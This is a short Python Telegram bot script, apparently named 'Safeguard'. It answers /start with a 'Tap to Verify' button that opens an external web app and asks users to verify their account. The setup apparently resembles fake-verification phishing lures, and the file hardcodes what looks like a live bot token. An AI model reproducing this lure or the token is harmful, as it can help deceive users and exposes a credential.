from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor

# ðŸ”¹ Replace with your actual bot token from @BotFather
TOKEN = "7790817420:AAGUb3F1O8Se_5MUG07HFA94T-FfAOT1V8k"

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# âœ… /start command handler
@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton(
            text="âœ… Tap to Verify", 
            web_app=types.WebAppInfo(url="https://DrDevPig.github.io/safeguard/")
        )
    )
    
    await message.answer(
        "Welcome to **Safeguard**!\n\nClick below to verify your account:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

# âœ… Start the bot
if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
